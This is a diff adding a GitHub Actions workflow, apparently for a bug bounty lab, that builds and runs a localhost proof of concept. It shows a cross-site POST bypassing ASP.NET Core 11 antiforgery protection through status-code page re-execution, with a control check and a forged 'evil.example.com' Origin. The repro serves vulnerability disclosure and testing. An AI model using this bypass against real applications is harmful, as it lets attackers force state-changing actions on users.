@@ -1,0 +1,127 @@
+name: aspnet11-csrf-reexecute-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/aspnet11-csrf-reexecute-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install .NET 11 RC1
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '11.0.100-rc.1.26425.128'
+
+      - name: Build local-only repro
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/aspnet11-csrf-reexecute /tmp/CSRF_REEXEC_MARKER
+          mkdir -p /tmp/aspnet11-csrf-reexecute
+          cat > /tmp/aspnet11-csrf-reexecute/Repro.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk.Web">
+            <PropertyGroup>
+              <TargetFramework>net11.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <Nullable>enable</Nullable>
+              <ImplicitUsings>enable</ImplicitUsings>
+            </PropertyGroup>
+          </Project>
+          EOF
+
+          cat > /tmp/aspnet11-csrf-reexecute/Program.cs <<'EOF'
+          using System.Net;
+          using Microsoft.AspNetCore.Antiforgery;
+          using Microsoft.AspNetCore.Builder;
+          using Microsoft.AspNetCore.Hosting;
+          using Microsoft.AspNetCore.Http;
+          using Microsoft.Extensions.Hosting;
+
+          var builder = WebApplication.CreateBuilder(args);
+          builder.WebHost.UseUrls("http://127.0.0.1:5127");
+          var app = builder.Build();
+
+          app.UseStatusCodePagesWithReExecute("/protected-reroute");
+
+          app.MapPost("/resource", (HttpContext ctx) =>
+          {
+              ctx.Response.StatusCode = StatusCodes.Status404NotFound;
+              return Task.CompletedTask;
+          }).DisableAntiforgery();
+
+          app.MapPost("/protected-reroute", async (HttpContext ctx) =>
+          {
+              File.WriteAllText("/tmp/CSRF_REEXEC_MARKER", "PROTECTED_STATE_CHANGE_EXECUTED");
+              ctx.Response.StatusCode = StatusCodes.Status200OK;
+              await ctx.Response.WriteAsync("protected action executed");
+          }).WithMetadata(new RequireAntiforgeryTokenAttribute());
+
+          await app.StartAsync();
+
+          using var client = new HttpClient { BaseAddress = new Uri("http://127.0.0.1:5127") };
+
+          static HttpRequestMessage CrossSitePost(string path)
+          {
+              var req = new HttpRequestMessage(HttpMethod.Post, path);
+              req.Headers.Add("Sec-Fetch-Site", "cross-site");
+              req.Headers.Add("Origin", "https://evil.example.com");
+              return req;
+          }
+
+          File.Delete("/tmp/CSRF_REEXEC_MARKER");
+          using (var direct = CrossSitePost("/protected-reroute"))
+          {
+              var response = await client.SendAsync(direct);
+              Console.WriteLine($"DIRECT_PROTECTED_STATUS={(int)response.StatusCode}");
+              Console.WriteLine($"DIRECT_PROTECTED_BODY={await response.Content.ReadAsStringAsync()}");
+              Console.WriteLine($"DIRECT_PROTECTED_MARKER={File.Exists("/tmp/CSRF_REEXEC_MARKER")}");
+              if (response.StatusCode != HttpStatusCode.BadRequest || File.Exists("/tmp/CSRF_REEXEC_MARKER"))
+              {
+                  Console.WriteLine("DIRECT_CSRF_CONTROL=FAIL");
+                  Environment.ExitCode = 1;
+                  await app.StopAsync();
+                  return;
+              }
+              Console.WriteLine("DIRECT_CSRF_CONTROL=PASS");
+          }
+
+          File.Delete("/tmp/CSRF_REEXEC_MARKER");
+          using (var viaReexecute = CrossSitePost("/resource"))
+          {
+              var response = await client.SendAsync(viaReexecute);
+              var body = await response.Content.ReadAsStringAsync();
+              Console.WriteLine($"REEXECUTE_ATTACK_STATUS={(int)response.StatusCode}");
+              Console.WriteLine($"REEXECUTE_ATTACK_BODY={body}");
+              Console.WriteLine($"REEXECUTE_ATTACK_MARKER={File.Exists("/tmp/CSRF_REEXEC_MARKER")}");
+              if (File.Exists("/tmp/CSRF_REEXEC_MARKER"))
+              {
+                  Console.WriteLine("CSRF_REEXECUTE_PROTECTED_POST_BYPASS=CONFIRMED");
+              }
+              else
+              {
+                  Console.WriteLine("CSRF_REEXECUTE_PROTECTED_POST_BYPASS=NOT_REPRODUCED");
+                  Environment.ExitCode = 1;
+              }
+          }
+
+          await app.StopAsync();
+          EOF
+
+          dotnet --info
+          dotnet build /tmp/aspnet11-csrf-reexecute/Repro.csproj -c Release -v:minimal
+
+      - name: Run exploit/control
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet /tmp/aspnet11-csrf-reexecute/bin/Release/net11.0/Repro.dll
